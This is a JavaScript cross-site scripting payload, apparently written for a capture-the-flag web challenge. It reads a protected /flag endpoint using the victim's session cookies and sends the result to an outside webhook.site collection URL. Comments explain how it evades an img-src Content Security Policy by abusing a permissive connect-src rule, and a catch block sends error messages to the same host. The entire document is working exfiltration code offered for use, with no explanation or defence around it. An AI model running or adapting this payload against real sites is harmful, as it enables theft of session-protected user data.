fetch("http://challenge.hacktheflag.one:30006/flag", {
  credentials: "include"  // if the flag requires cookies/session as admin
})
  .then(r => {
    if (!r.ok) throw new Error("Fetch failed: " + r.status);
    return r.text();
  })
  .then(flag => {
    // Exfil without triggering img-src CSP
    // Use fetch (allowed by connect-src *) with no-cors or simple GET
    fetch("https://webhook.site/0147bc57-d33b-4bb4-942f-ee367aeb136a?flag=" + encodeURIComponent(flag), {
      mode: "no-cors",       // prevents reading response, but request still fires
      keepalive: true        // helps send even if page unloads
    });
  })
  .catch(e => {
    // Debug exfil if needed
    fetch("https://webhook.site/0147bc57-d33b-4bb4-942f-ee367aeb136a?err=" + encodeURIComponent(e.message), {
      mode: "no-cors"
    });
  });
